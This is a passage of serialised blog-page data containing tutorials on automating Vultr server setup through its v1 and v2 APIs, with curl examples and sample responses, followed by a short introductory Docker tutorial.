YOURKEY' --data \"SUBID=12345\" --data-urlencode 'label=my server!' \"https://api.vultr.com/v1/server/label_set\"\n```\n\n### Server region\n\n#### /v1/regions/list\n\nRetrieve a list of all active regions. Note that just because a region is listed here, does not mean that there is room for new servers.\n\n```\nAPI Key Required: No\nRequest Type: GET\n```\n\nExample Request:\n\n```\ncurl https://api.vultr.com/v1/regions/list\n```\n\nExample Response:\n\n```\n{\n    \"1\": {\n        \"DCID\": \"1\",\n        \"name\": \"New Jersey\",\n        \"country\": \"US\",\n        \"continent\": \"North America\",\n        \"state\": \"NJ\",\n        \"ddos_protection\": true,\n        \"block_storage\": true,\n        \"regioncode\": \"EWR\"\n    },\n    \"2\": {\n        \"DCID\": \"2\",\n        \"name\": \"Chicago\",\n        \"country\": \"US\",\n        \"continent\": \"North America\",\n        \"state\": \"IL\",\n        \"ddos_protection\": false,\n        \"block_storage\": false,\n        \"regioncode\": \"ORD\"\n    }\n}\n```\n\nExample Parameter\n\n```\n--data \"DCID=8\" = \"DCID\":\"8\",\"name\":\"London\" (server region)\n```\n\n#### List of All Regions\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/57030746-2ab6-479d-b3eb-0c87341b7aa6.png\" class=\"img-fluid\" alt=\"List of all regions\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">List of all regions.</figcaption>\n</figure>\n\n### Plans\n\n#### /v1/plans/list\n\nRetrieve a list of all active plans. Plans that are no longer available will not be shown.\n\n```\nAPI Key Required: No\nRequest Type: GET\n```\n\nExample Request:\n\n```\ncurl https://api.vultr.com/v1/plans/list?type=vc2\n```\n\nExample Response:\n\n```\n{\n    \"1\": {\n        \"VPSPLANID\": \"1\",\n        \"name\": \"Starter\",\n        \"vcpu_count\": \"1\",\n        \"ram\": \"512\",\n        \"disk\": \"20\",\n        \"bandwidth\": \"1\",\n        \"price_per_month\": \"5.00\",\n        \"windows\": false,\n        \"plan_type\": \"SSD\",\n        \"available_locations\": [\n            1,\n            2,\n            3\n        ]\n    },\n    \"2\": {\n        \"VPSPLANID\": \"2\",\n        \"name\": \"Basic\",\n        \"vcpu_count\": \"1\",\n        \"ram\": \"1024\",\n        \"disk\": \"30\",\n        \"bandwidth\": \"2\",\n        \"price_per_month\": \"8.00\",\n        \"windows\": false,\n        \"plan_type\": \"SATA\",\n        \"available_locations\": [],\n        \"deprecated\": true\n    }\n}\n```\n\nExample Parameter\n\n```\n--data \"VPSPLANID=201\" = \"VPSPLANID\":\"201\",\"name\":\"1024 MB RAM,25 GB SSD,1.00 TB BW\" (plan)\n```\n\n#### List of all plans\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/5ad4d434-fb5c-4dee-ad05-93f2a35a5dc5.png\" class=\"img-fluid\" alt=\"List Of All Plans\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">List Of All Plans.</figcaption>\n</figure>\n\n\n### Operating System\n\n#### /v1/os/list\n\nRetrieve a list of available operating systems. If the \"windows\" flag is true, a Windows license will be included with the instance, which will increase the cost.\n\n```\nAPI Key Required: No\nRequest Type: GET\n```\n\nExample Request:\n\n```\ncurl https://api.vultr.com/v1/os/list\n```\n\nExample Response:\n\n```\n{\n    \"127\": {\n        \"OSID\": \"127\",\n        \"name\": \"CentOS 6 x64\",\n        \"arch\": \"x64\",\n        \"family\": \"centos\",\n        \"windows\": false\n    },\n    \"148\": {\n        \"OSID\": \"148\",\n        \"name\": \"Ubuntu 12.04 i386\",\n        \"arch\": \"i386\",\n        \"family\": \"ubuntu\",\n        \"windows\": false\n    }\n}\n```\n\nExample Parameter\n\n```\n--data \"OSID=270\" = \"OSID\":270,\"name\":\"Ubuntu 18.04 x64\" (Operating System)\n```\n\n#### List of All Operating Systems\n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/bd1d2d1a-1014-41c6-902a-e1ac6b8c6572.png\" class=\"img-fluid\" alt=\"List of all Operating Systems\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">List of all Operating Systems.</figcaption>\n</figure>\n\n\n### Application\n\n#### /v1/app/list\n\nRetrieve a list of available applications. These refer to applications that can be launched when creating a Vultr VPS.\n\nThe \"surcharge\" field is deprecated and will always be set to zero.\n\n```\nAPI Key Required: No\nRequest Type: GET\n```\n\nExample Request:\n\n```\ncurl https://api.vultr.com/v1/app/list\n```\n\nExample Response:\n\n```\n{\n    \"1\": {\n        \"APPID\": \"1\",\n        \"name\": \"LEMP\",\n        \"short_name\": \"lemp\",\n        \"deploy_name\": \"LEMP on CentOS 6 x64\",\n        \"surcharge\": 0\n    },\n    \"2\": {\n        \"APPID\": \"2\",\n        \"name\": \"WordPress\",\n        \"short_name\": \"wordpress\",\n        \"deploy_name\": \"WordPress on CentOS 6 x64\",\n        \"surcharge\": 0\n    }\n}\n```\n\nExample Parameter\n\n```\n--data \"APPID=17\" = \"APPID\":\"17\", \"name\":\"Docker\" (application)\n```\n\n#### Full List of Apps\n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/b08d3fce-7228-40af-9a4c-3dbdbeeb9003.png\" class=\"img-fluid\" alt=\"Full List Of Apps\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Full List Of Apps.</figcaption>\n</figure>\n\n\n### The process in creating the docker container, finding the app id, the dc number, and creating it\n\nExample Command\n```\ncurl -H \"API-Key: YOURKEY\" https://api.vultr.com/v1/server/create --data \"DCID=8\" --data \"VPSPLANID=201\" --data \"OSID=270\" --data \"APPID=17\" --data \"label=Docker-Server\"\n```\n\n```\n--data \"DCID=8\" = \"DCID\":\"8\",\"name\":\"London\" (server region)\n--data \"VPSPLANID=201\" = \"VPSPLANID\":\"201\",\"name\":\"1024 MB RAM,25 GB SSD,1.00 TB BW\" (plan)\n--data \"OSID=270\" = \"OSID\":270,\"name\":\"Ubuntu 18.04 x64\" (Operating System)\n--data \"APPID=17\" = \"APPID\":\"17\", \"name\":\"Docker\" (application)\n--data \"label=docker-test\" = \"label=Docker-Server\" (server label)\n```\n\n### Destroy (delete) a virtual machine. All data will be permanently lost, and the IP address will be released. There is no going back from this call.\n\nExample Request:\n\n```\ncurl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/server/destroy --data 'SUBID=576965'\n```\n\nUsed this command to find your SUBID inside your Vultr Account:\n\n```\ncurl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/server/list\n```\n\nExample Response:\n\n```\n{\n    \"576965\": {\n        \"SUBID\": \"576965\",\n        \"os\": \"CentOS 6 x64\",\n        \"ram\": \"4096 MB\",\n        \"disk\": \"Virtual 60 GB\",\n        \"main_ip\": \"123.123.123.123\",\n        \"vcpu_count\": \"2\",\n        \"location\": \"New Jersey\",\n        \"DCID\": \"1\",\n        \"default_password\": \"nreqnusibni\",\n        \"date_created\": \"2013-12-19 14:45:41\",\n        \"pending_charges\": \"46.67\",\n        \"status\": \"active\",\n        \"cost_per_month\": \"10.05\",\n        \"current_bandwidth_gb\": 131.512,\n        \"allowed_bandwidth_gb\": \"1000\",\n        \"netmask_v4\": \"255.255.255.248\",\n        \"gateway_v4\": \"123.123.123.1\",\n        \"power_status\": \"running\",\n        \"server_state\": \"ok\",\n        \"VPSPLANID\": \"28\",\n        \"v6_main_ip\": \"2001:0DB8:1000:0000:0000:000:0000:0101\",\n        \"v6_network_size\": \"64\",\n        \"v6_network\": \"2001:DB8:1000::\",\n        \"v6_networks\": [\n            {\n                \"v6_network\": \"2001:DB8:1000::\",\n                \"v6_main_ip\": \"2001:0DB8:1000:0000:0000:000:0000:0101\",\n                \"v6_network_size\": \"64\"\n            }\n        ],\n        \"label\": \"my new server\",\n        \"internal_ip\": \"10.99.0.10\",\n        \"kvm_url\": \"https://my.vultr.com/subs/novnc/api.php?data=eawxFVZw2mXnhGUV\",\n        \"auto_backups\": \"yes\",\n        \"tag\": \"mytag\",\n        \"OSID\": \"127\",\n        \"APPID\": \"0\",\n        \"FIREWALLGROUPID\": \"0\"\n    }\n}\n```\n\nServer List\n\nList all active or pending virtual machines on the current account.\n\nTo determine that a server is ready for use, you may poll <code>/v1/server/list?SUBID=SUBID</code> and check that the \"status\" field is set to \"active\", then test your OS login with SSH (Linux) or RDP (Windows).\n\nThe \"status\" field represents the status of the subscription and will be one of pending, active, suspended, or closed. If the status is \"active\", you can check \"power_status\" to determine if the VPS is powered on or not. When status is \"active\", you may also use \"server_state\" for a more detailed status of: none, locked, installingbooting, isomounting, or ok.\n\nThe \"v6_network\", \"v6_main_ip\", and \"v6_network_size\" fields are deprecated in favor of \"v6_networks\".\n\nThe \"kvm_url\" value will change periodically. It is not advised to cache this value.\n\nIf you need to filter the list, review the parameters for this function. Currently, only one filter at a time may be applied (SUBID, tag, label, main_ip).\n\n```\nAPI Key Required: Yes\nRequest Type: GET\nRequired Access: GET\n```\n\n```\n{% highlight PowerShell %}\ncurl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/server/list\n```\n\nExample Response:\n```\n{\n    \"576965\": {\n        \"SUBID\": \"576965\",\n        \"os\": \"CentOS 6 x64\",\n        \"ram\": \"4096 MB\",\n        \"disk\": \"Virtual 60 GB\",\n        \"main_ip\": \"123.123.123.123\",\n        \"vcpu_count\": \"2\",\n        \"location\": \"New Jersey\",\n        \"DCID\": \"1\",\n        \"default_password\": \"nreqnusibni\",\n        \"date_created\": \"2013-12-19 14:45:41\",\n        \"pending_charges\": \"46.67\",\n        \"status\": \"active\",\n        \"cost_per_month\": \"10.05\",\n        \"current_bandwidth_gb\": 131.512,\n        \"allowed_bandwidth_gb\": \"1000\",\n        \"netmask_v4\": \"255.255.255.248\",\n        \"gateway_v4\": \"123.123.123.1\",\n        \"power_status\": \"running\",\n        \"server_state\": \"ok\",\n        \"VPSPLANID\": \"28\",\n        \"v6_main_ip\": \"2001:0DB8:1000:0000:0000:000:0000:0101\",\n        \"v6_network_size\": \"64\",\n        \"v6_network\": \"2001:DB8:1000::\",\n        \"v6_networks\": [\n            {\n                \"v6_network\": \"2001:DB8:1000::\",\n                \"v6_main_ip\": \"2001:0DB8:1000:0000:0000:000:0000:0101\",\n                \"v6_network_size\": \"64\"\n            }\n        ],\n        \"label\": \"my new server\",\n        \"internal_ip\": \"10.99.0.10\",\n        \"kvm_url\": \"https://my.vultr.com/subs/novnc/api.php?data=eawxFVZw2mXnhGUV\",\n        \"auto_backups\": \"yes\",\n        \"tag\": \"mytag\",\n        \"OSID\": \"127\",\n        \"APPID\": \"0\",\n        \"FIREWALLGROUPID\": \"0\"\n    }\n}\n```\n\n### Changing the plan should you need more space\n\nUpgrade the plan of a virtual machine. The virtual machine will be rebooted upon a successful upgrade.\n\n```\nAPI Key Required: Yes\nRequest Type: POST\nRequired Access: POST\n```\n\nExample:\n\n```\ncurl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/server/upgrade_plan --data 'SUBID=39960375' --data 'VPSPLANID=29'\n```\n\n### Saving a snapshot of your machine.\n\nCreate a snapshot from an existing virtual machine. The virtual machine does not need to be stopped.\n\n```\nAPI Key Required: Yes\nRequest Type: POST\nRequired Access: POST\n```\n\nExample Request:\n\n```\ncurl -H 'API-Key: YOURKEY' https://api.vultr.com/v1/snapshot/create --data 'SUBID=1312965'\n```\n\nExample Response:\n```\n{\n    \"SNAPSHOTID\": \"544e52f31c706\",\n    \"v2_id\": \"82f4a9f9-6d8b-44c8-ad59-6ade845bd2a6\"\n}\n```\n\n### How to Use Docker: Creating Your First Docker Container\n\nThis tutorial explains the basics of getting started with Docker. I assume that you already have Docker installed. Steps in this tutorial will work on any Linux distribution that is compatible with Docker (CentOS, Ubuntu, etc).\n\n#### Creating your first Docker container\n\nDocker creates virtual containers. Docker's container system is very efficient because it works with commits. This saves space, and allows you to see changes to the container. For example, if you install Apache in a container, you can create a commit with the name \"Installed Apache\" so you know exactly what happened.\n\nThe first thing we'll do is pull from a repository. Say that you want to install Ubuntu in a container, you can pull Ubuntu from the repository:\n\n\n```\ndocker pull ubuntu\n```\n\nBe patient, as this can take a while. After everything has been downloaded, you can create a container with this OS:\n\n```\ndocker run -i -t ubuntu /bin/bash\n```\n\nOr with Debian, for example:\n\n```\ndocker run -i -t debian /bin/bash\n```\n\nIf it can't find the OS (not pulled yet) it will automatically pull it from Docker Hub.\n\nEffectively, you now have a container! You are running bash in the slimmed down container that is managed by Docker. Try running some common Linux commands to get a feel for the environment.\n\nWhen you type exit to <code>exit</code> the container and return to your main OS, all of your changes will be gone. To save changes to a container, we use commits.\n\n#### Commits\n\nWhen you create a Docker container, its hostname is automatically generated. For example, when I create a new Ubuntu container, I might get the hostname f7943e42aff0. This is the name that Docker has given to your container.\n\nInstall what you want on it, and make sure everything works. Then exit your Docker container:\n\n```\nexit\n```\n\nWe now need to commit; otherwise, all of your changes will be lost.\n\n```\ndocker commit -a \"William E.\" -m \"Installed Apache\" f7943e42aff0 apachesnapshot\n```\n\nThe -a switch can be used to properly determine who authored that commit (who made the changes in the container). -m is the commit message. The f7943e42aff0 is the hostname of my container. In your case it will differ, as Docker generates them randomly. apachesnapshot is the name of your image.\n\nYou can view a list with all of the images on your local machine. The newest ones are at the top.\n\n```\ndocker images\n```\n\nIn order to start your Docker container with the changes, run:\n\n```\ndocker run -t -i apachesnapshot /bin/bash\n```\n\n#### Using Dockerfiles\n\nDockerfiles can be used to make images with applications already installed. This makes it convenient to start a container without having to run a specific command. For example, if we want to create an image with the file ~/file.txt already created, we would use the following Dockerfile:\n\n```\nFROM ubuntu:14.04\nMAINTAINER William E. <william@localhost>\nRUN touch ~/file.txt\n```\n\nIn order to create a Docker container with this Dockerfile, make a folder for your Dockerfile on your local machine (I used ~/files). Put the contents of your Dockerfile in a file called Dockerfile. You can now create an image with it by running:\n\n```\ndocker build -t=\"test\" .\n```\n\nThis creates a Docker image from your Dockerfile script. You can now run your container. test is the same value as test in the docker build command.\n\n```\ndocker run -t -i test /bin/bash\n```\n\nWhen the bash shell opens, you'll see that the ~/file.txt has already been created.\n\nThis is just a taste of the powerful environments that you can create using Docker. The Docker official manual goes into much further depth on these topics. At this point, you should be able to experiment running existing containers and begin to start imaging your own.\n\nYou can learn more docker commands and functions <a class=\"hover-link\" target=\"_blank\" href=\"https://docker-curriculum.com/\">here</a>."},{"fields":{"slug":"/automating-vultr-setup-with-vultr-api-v2"},"excerpt":null,"frontmatter":{"date":"20th April 2020 ","title":"Automating Vultr Setup with Vultr API V2","description":"","tags":"vultr, api","posttype":"tutorial"},"body":"The Vultr API v2 is a set of HTTP endpoints that adhere to RESTful design principles and CRUD actions with predictable URIs. It uses standard HTTP response codes, authentication, and verbs. The API has consistent and well-formed JSON requests and responses with cursor-based pagination to simplify list handling. Error messages are descriptive and easy to understand. All functions of the Vultr customer portal are accessible via the API, enabling you to script complex unattended scenarios with any tool fluent in HTTP.\n\n### API Key\n\nThe Vultr API v2 uses API keys for authentication. You can manage your API keys in the Vultr customer portal. Please do not share API keys publicly, or embed them in client-side code. It is a good security practice to restrict their use by IP address in the customer portal.\n\nTo authenticate a request, send your API Key as a bearer token in the request header.\n\nAuthentication Example\n\n```\ncurl -H 'Authorization: Bearer {api-key}' https://api.vultr.com/v2/account\n```\n\n### List Regions\n\nList all Regions at Vultr.\n\nExample Request:\n\n```\ncurl --location --request GET 'https://api.vultr.com/v2/regions'\n```\n\nExample Response:\n\n```\n\n{\n   \"regions\":[\n      {\n         \"id\":\"ams\",\n         \"city\":\"Amsterdam\",\n         \"country\":\"NL\",\n         \"continent\":\"Europe\",\n         \"options\":[\n            \"ddos_protection\"\n         ]\n      },\n      {\n         \"id\":\"atl\",\n         \"city\":\"Atlanta\",\n         \"country\":\"US\",\n         \"continent\":\"North America\",\n         \"options\":\\[\n            \n         \\]\n      },\n}\n\n```\n\n#### List of All Regions\n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/3540ca36-734e-4cd5-9e9d-512b125952c0.png\" class=\"img-fluid\" alt=\"List all Regions\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">List all Regions.</figcaption>\n</figure>\n\n### Plans\n\nA Plan is a particular configuration of vCPU, RAM, SSD, and bandwidth to deploy an Instance. Not all Plans are available in all Regions. You can browse plans in the Customer Portal or get a list of Plans from the API.\n\n#### List Plans\n\nGet a list of all VPS plans at Vultr. The list can be filtered by type.\n\nExample Request:\n\n```\ncurl --location --request GET 'https://api.vultr.com/v2/plans'\n```\n\nExample Response:\n\n```\n{\n   \"plans\":[\n      {\n         \"id\":\"vc2-1c-1gb\",\n         \"vcpu_count\":1,\n         \"ram\":1024,\n         \"disk\":25,\n         \"bandwidth\":1024,\n         \"monthly_cost\":5,\n         \"type\":\"vc2\",\n         \"locations\":[\"ewr\",\"ord\",\"dfw\",\"sea\",\"lax\",\"atl\",\"ams\",\"lhr\",\"fra\",\"sjc\",\"syd\",\"yto\",\"cdg\",\"nrt\",\"mia\",\"sgp\"]\n      },\n      {\n         \"id\":\"vc2-1c-2gb\",\n         \"vcpu_count\":1,\n         \"ram\":2048,\n         \"disk\":55,\n         \"bandwidth\":2048,\n         \"monthly_cost\":10,\n         \"type\":\"vc2\",\n         \"locations\":[\"ewr\",\"ord\",\"dfw\",\"sea\",\"lax\",\"atl\",\"ams\",\"lhr\",\"fra\",\"sjc\",\"syd\",\"yto\",\"cdg\",\"nrt\",\"mia\",\"sgp\"]\n      },\n}\n```\n\n#### List of all plans\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"11df6d8d-f426-4bb8-8dc7-034f59e15a34.png\" class=\"img-fluid\" alt=\"List of all Plans\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">List of all Plans.</figcaption>\n</figure>\n\n\n### Operating System\n\n#### List OS\n\nWe have a wide range of operating systems available to deploy server instances. You can also upload an ISO or choose from our public ISO library.\n\nList the OS images available for installation at Vultr.\n\nExample Request:\n\n```\ncurl --location --request GET 'https://api.vultr.com/v2/os'\n```\n\nExample Response:\n\n```\n{\n   \"os\":[\n      {\n         \"id\":124,\n         \"name\":\"Windows 2012 R2 x64\",\n         \"arch\":\"x64\",\n         \"family\":\"windows\"\n      },\n      {\n         \"id\":159,\n         \"name\":\"Custom\",\n         \"arch\":\"x64\",\n         \"family\":\"iso\"\n      },\n       ],\n   \"meta\":{\n      \"total\":25,\n      \"links\":{\n         \"next\":\"\",\n         \"prev\":\"\"\n      }\n   }\n}\n```\n\n#### List of All Operation System\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/29474923-2e2b-49b9-bdef-3145a9fea14e.png\" class=\"img-fluid\" alt=\"List of All Operating Systems\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">List of All Operating Systems.</figcaption>\n</figure>\n\n### Application\n\nOne-Click Applications are ready-to-run with minimal configuration. We have an extensive documentation library for our One-Click Apps.\n\nGet a list of all One-Click Applications.\n\nExample Request:\n\n```\ncurl --location --request GET 'https://api.vultr.com/v2/applications'\n```\n\nExample Response:\n```\n{\n  \"applications\": [\n    {\n      \"id\": 1,\n      \"name\": \"LEMP\",\n      \"short_name\": \"lemp\",\n      \"deploy_name\": \"LEMP on CentOS 6 x64\"\n    }\n  ],\n  \"meta\": {\n    \"total\": 1,\n    \"links\": {\n      \"next\": \"\",\n      \"prev\": \"\"\n    }\n  }\n}\n```\n\n### Full List of Apps\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/15e68524-9e6c-4791-8a42-dcf612ee64b2.png\" class=\"img-fluid\" alt=\"List of all Applications\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">List of all Applications.</figcaption>\n</figure>\n\n\nOnce you determine all id's parameter needed, you can now start create new server.\n\n### Create Instance\n\nCreate a new VPS Instance in a <code>region</code> with the desired <code>plan</code>. Choose one of the following to deploy the instance:\n\n<ul>\n<li>os_id</li>\n<li>iso_id</li>\n<li>snapshot_id</li>\n<li>app_id</li>\n</ul>\n\nSupply other attributes as desired.\n\nExample Request:\n\n```\ncurl --location --request POST 'https://api.vultr.com/v2/instances' \\\n--header 'Authorization: Bearer {api-key}' \\\n--header 'Content-Type: application/json' \\\n--data-raw '{\n\t\"region\" : \"ewr\", \n\t\"plan\" : \"vc2-6c-16gb\", \n\t\"label\" : \"my label\",\n\t\"os_id\" : 362,\n\t\"user_data\" : \"dGVzdA==\",\n\t\"backups\": \"enabled\"\n}'\n```\n\nREQUEST BODY SCHEMA: application/json\n\nInclude a JSON object in the request body with a content type of application/json.\n\n<table class=\"table\">\n<tr>\n<th>Parameter</th>\n<th>Type</th>\n<th>Description</th>\n</tr>\n<tr>\n<td>region (required)</td>\n<td>string</td>\n<td>The Region id where the Instance is located.</td>\n</tr>\n<tr>\n<td>plan (required)</td>\n<td>string</td>\n<td>The Plan id to use when deploying this instance.</td>\n</tr>\n<tr>\n<td>os_id</td>\n<td>integer</td>\n<td>The Operating System id to use when deploying this instance.</td>\n</tr>\n<tr>\n<td>ipxe_chain_url</td>\n<td>string</td>\n<td>The URL location of the iPXE chainloader.</td>\n</tr>\n<tr>\n<td>iso_id</td>\n<td>string</td>\n<td>The ISO id to use when deploying this instance.</td>\n</tr>\n<tr>\n<td>script_id</td>\n<td>integer</td>\n<td>The Startup Script id to use when deploying this instance.</td>\n</tr>\n<tr>\n<td>snapshot_id</td>\n<td>string</td>\n<td>The Snapshot id to use when deploying the instance.</td>\n</tr>\n<tr>\n<td>enable_ipv6</td>\n<td>boolean</td>\n<td>Enable IPv6.\ntrue\nfalse</td>\n</tr>\n<tr>\n<td>attach_private_network</td>\n<td>Array of Strings</td>\n<td>An array of Private Network ids to attach to this Instance. This parameter takes precedence over enable_private_network. Please choose one parameter.</td>\n</tr>\n<tr>\n<td>label</td>\n<td>string</td>\n<td>A user-supplied label for this instance.</td>\n</tr>\n<tr>\n<td>sshkey_id</td>\n<td>string</td>\n<td>The SSH Key id to install on this instance.</td>\n</tr>\n<tr>\n<td>backups</td>\n<td>string</td>\n<td>Enable automatic backups for the instance.\nenabled\ndisabled</td>\n</tr>\n<tr>\n<td>app_id</td>\n<td>integer</td>\n<td>The Application id to use when deploying this instance.</td>\n</tr>\n<tr>\n<td>user_data</td>\n<td>string</td>\n<td>The user-supplied, base64 encoded user data to attach to this instance.</td>\n</tr>\n<tr>\n<td>ddos_protection</td>\n<td>boolean</td>\n<td>Enable DDoS protection (there is an additional charge for this).\ntrue\nfalse</td>\n</tr>\n<tr>\n<td>activation_email</td>\n<td>boolean</td>\n<td>Notify by email after deployment.\ntrue\nfalse</td>\n</tr>\n<tr>\n<td>hostname</td>\n<td>string</td>\n<td>The hostname to use when deploying this instance.</td>\n</tr>\n<tr>\n<td>tag</td>\n<td>string</td>\n<td>The user-supplied tag.</td>\n</tr>\n<tr>\n<td>firewall_group_id</td>\n<td>string</td>\n<td>The Firewall Group id to attach to this Instance.</td>\n</tr>\n<tr>\n<td>reserved_ipv4</td>\n<td>string</td>\n<td>ID of the floating IP to use as the main IP of this server.</td>\n</tr>\n<tr>\n<td>enable_private_network</td>\n<td>boolean</td>\n<td>If true, private networking support will be added to the new server.\nThis parameter attaches a single network. When no network exists in the region, it will be automatically created.\nIf there are multiple private networks in the instance's region, use attach_private_network instead to specify a network.</td>\n</tr>\n</table>"}]}}},"tag":"kde"}},"staticQueryHashes":["310218920"],"slicesMap":{}}